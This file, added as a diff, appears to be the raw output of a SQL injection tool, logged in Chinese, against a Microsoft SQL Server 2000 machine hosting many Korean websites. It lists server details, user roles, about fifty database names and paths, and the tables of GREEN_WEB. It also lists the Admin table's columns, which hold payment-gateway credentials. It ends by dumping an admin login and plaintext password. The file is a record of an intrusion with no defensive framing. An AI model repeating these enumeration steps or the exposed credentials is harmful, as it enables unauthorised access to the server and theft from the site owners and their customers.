@@ -1,0 +1,309 @@
+
+■数据库信息:============================================================
+- 数据库名：GREEN_WEB
+- 用户名：green_web
+- 版本：Microsoft SQL Server  2000 - 8.00.760 (Intel X86) 
+	Dec 17 2002 14:22:05 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：COLESYSIT
+- 服务名：MSSQLSERVER
+- 系统用户名：green_web
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+apsat_web	C:\Program Files\Microsoft SQL Server\MSSQL\Data\imageclinic_co_kr.mdf	
+apsi_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\rental2_setting.mdf	
+bns_web	C:\Program Files\Microsoft SQL Server\MSSQL\Data\bns_web_Data.MDF	
+cerikedu	C:\Program Files\Microsoft SQL Server\MSSQL\data\cerikedu\cerikedu_Data.MDF	
+dental_test	C:\Program Files\Microsoft SQL Server\MSSQL\data\dental_test_Data.MDF	
+dental_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\dental_web_Data.MDF	
+dobeel	C:\Program Files\Microsoft SQL Server\MSSQL\data\dobeel_Data.MDF	
+edutex_kr	C:\Program Files\Microsoft SQL Server\MSSQL\data\edutex_kr_Data.MDF	
+et_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\et_web_Data.MDF	
+GATE_WEB	C:\Program Files\Microsoft SQL Server\MSSQL\data\GATE_WEB_Data.MDF	
+gd21i	C:\Program Files\Microsoft SQL Server\MSSQL\Data\gd21i_Data.MDF	
+GREEN_WEB	C:\Program Files\Microsoft SQL Server\MSSQL\data\GREEN_WEB_Data.MDF	
+greenapparel	C:\Program Files\Microsoft SQL Server\MSSQL\data\greenapparel_Data.MDF	
+gsmedia_new	C:\Program Files\Microsoft SQL Server\MSSQL\data\gsmedia\rental2_setting.mdf	
+HD_DBF	C:\Program Files\Microsoft SQL Server\MSSQL\data\HD_DBF_Data.MDF	
+hrd_kofoti	C:\Program Files\Microsoft SQL Server\MSSQL\Data\hrd_kofoti_Data.MDF	
+hrd_kofoti_edu	C:\Program Files\Microsoft SQL Server\MSSQL\Data\hrd_kofoti_edu\hrd_kofoti_edu_Data.MDF	
+ietree	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ietree_Data.MDF	
+imageclinic_old_backup	C:\Program Files\Microsoft SQL Server\MSSQL\Data\imageclinic_old\imageclinic_co_kr.mdf	
+imageclinic_old2	C:\Program Files\Microsoft SQL Server\MSSQL\Data\imageclinic_old2\imageclinic_co_kr.mdf	
+imageclinic_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\imageclinic\rental2_setting.mdf	
+jesus52	C:\Program Files\Microsoft SQL Server\MSSQL\Data\jesus52_Data.MDF	
+kf	C:\Program Files\Microsoft SQL Server\MSSQL\data\kf_Data.MDF	
+kf_member	C:\Program Files\Microsoft SQL Server\MSSQL\data\kf_member_Data.MDF	
+kf_stat	C:\Program Files\Microsoft SQL Server\MSSQL\data\kf_stat_Data.MDF	
+kia_intranet	C:\Program Files\Microsoft SQL Server\MSSQL\data\kia_intranet_Data.MDF	
+knitsweater	C:\Program Files\Microsoft SQL Server\MSSQL\Data\knitsweater_Data.MDF	
+kofoti	C:\Program Files\Microsoft SQL Server\MSSQL\Data\kofoti_Data.MDF	
+koreafocus_new	C:\Program Files\Microsoft SQL Server\MSSQL\data\koreafocus_new_Data.MDF	
+koreanurse_web	C:\Program Files\Microsoft SQL Server\MSSQL\Data\homep.mdf	
+koteri_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\koteri_web\rental2_setting.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+mirae_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\mirae_web_Data.MDF	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+PMC_WEB	C:\Program Files\Microsoft SQL Server\MSSQL\data\PMC_WEB_Data.MDF	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+Redsoft	C:\Program Files\Microsoft SQL Server\MSSQL\data\Redsoft_Data.MDF	
+SHENG_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\SHENG_web_Data.MDF	
+shrdc	C:\Program Files\Microsoft SQL Server\MSSQL\Data\shrdc_Data.MDF	
+siks_cr_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\siks_web\cr_web\rental2_setting.mdf	
+siks_kr_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\siks_web\koreanhistory_web\rental2_setting.mdf	
+siks_lllife_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\siks_web\lllife_web\rental2_setting.mdf	
+siks_md_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\siks_web\modernkorea_web\rental2_setting.mdf	
+siks_sj_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\siks_web\sejong_web\rental2_setting.mdf	
+siks_web	C:\Program Files\Microsoft SQL Server\MSSQL\Data\siks_web\siks_web_Data.MDF	
+special_mall	C:\Program Files\Microsoft SQL Server\MSSQL\data\special_mall_Data.MDF	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+vm21_web	C:\Program Files\Microsoft SQL Server\MSSQL\data\vm21_web_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Internet Information Services	sleeping	COLESYSIT	4616	AWAITING COMMAND		
+Internet Information Services	sleeping	COLESYSIT	4616	AWAITING COMMAND		
+Internet Information Services	sleeping	COLESYSIT	4616	AWAITING COMMAND		
+Internet Information Services	sleeping	COLESYSIT	4616	AWAITING COMMAND		
+Internet Information Services	sleeping	COLESYSIT	4616	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+COLESYSIT	SQL Server	SQLOLEDB	COLESYSIT		COLESYSIT	
+MIRAE_WEB	SQL Server	SQLOLEDB	MIRAE_WEB		MIRAE_WEB	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+------------------------------------------------------------
+正在获取数据库 [GREEN_WEB] 的表名……
+一次性获取失败，正在批次获取……
+ t_t
+Admin_Member_Group
+Admin
+Admin_Sort
+AdminList
+Board
+Board_Config
+Board_Kind
+board_Opinion
+Boardstat
+Calendar
+co_photo
+co_photoAlbum
+co_photoReply
+Member
+Member_Delete
+Member_Log
+Zip
+PopupMaker
+category
+syscommand
+depth1
+goods
+jumpouser
+mov_content
+order_cart
+order_note
+prof_mov_memo
+prodboard
+prof_pds
+jindo_check
+mov_board
+mov_pds
+SearchEngineLog
+SearchEngine
+SitePartner
+From_Site
+site_info
+MailForm
+order_info
+order_goods
+dg_member
+dtproperties
+
+------------------------------------------------------------
+正在获取 [GREEN_WEB].[Admin] 的列名……
+一次性获取失败，正在批次获取……
+ num
+siteID
+dbpass
+admin_id
+admin_password
+service
+homepage
+homepage2
+homepage3
+homepage4
+homepage5
+homepage6
+wrdate
+startDate
+endDate
+goods_siteID
+cybermoney
+cybermoney_limit
+admin_phone
+bar_title
+admin_email
+sitename
+sitecolor
+un_nun
+i_ga
+ul_rl
+wa_gua
+admin_address
+admin_name
+tongsin_number
+admin_fax
+security_name
+security_email
+category_some
+small_width
+small_height
+middle_width
+middle_height
+big_width
+big_height
+home1
+home2
+home3
+home4
+home5
+main1
+main2
+submain1
+submain2
+content
+list
+besong_limit
+besong_money
+image_line
+home_backline
+site_align
+site_line
+siteLineYN
+layout
+site_background
+backgroundBgcolor
+backgroundRepeat
+backgroundStartpoint
+siteWidth
+leftWidth
+Lightlayer_left
+Lightlayer_top
+popup_ok
+cardsale
+company_info
+company_link
+loginbox
+toploginbox
+Export_Limit
+Export_money
+cardsystem
+CardCompany
+MerChandID
+MerChandPWD
+kcp_shopID
+mall2u_kcp_url
+Ret_URL
+MerChantID
+MerChantSecurityID
+Interest_Free
+Prefix
+card_ID
+form_key
+auth_code
+AllTheGateID
+Dacom_ID
+Dacom_Mertkey
+InicisUrl
+KCPUrl
+ImNetpiaUrl
+AllatbizUrl
+AllTheGateUrl
+admin_content
+main_image_type
+main_notice_font
+admin_ck
+choicelistCk
+rightMouse
+metatag
+UploadComponent
+KSPayID
+ListRow
+company_name
+company_number
+company_kind
+company_item
+company_stamp
+Flashimg
+FlashWidth
+FlashHight
+topmenuFlash
+CrossKey
+allatbiz_partner_id
+MxID
+MxOTP
+designTopmenu
+designCopyright
+designContent
+designLayout
+designGoods
+designRightText1
+designRightText2
+Escrow_cardsystem
+Escrow_CardCompany
+Escrow_merchandID
+Escrow_merChandPWD
+Escrow_InicisUrl
+Escrow_allatbiz_id
+AuctionFlag
+smsFId
+smsFPwd
+kcp_site_key
+TheKn_Id
+TheKn_besong_code
+TheKn_Login_Id
+TheKn_Login_Password
+TheKn_Image_Url
+TheKn_Image_Id
+TheKn_Image_Password
+cafe24
+cafe24_id
+cafe24_pw
+pandoraKey
+liveactYN
+liveAct_siteid
+
+正在执行查询：select top 3 num,admin_id,admin_password from GREEN_WEB..Admin order by admin_password
+正在执行查询：select top 3 num,admin_id,admin_password from GREEN_WEB..Admin order by admin_password
+1	green	1234	
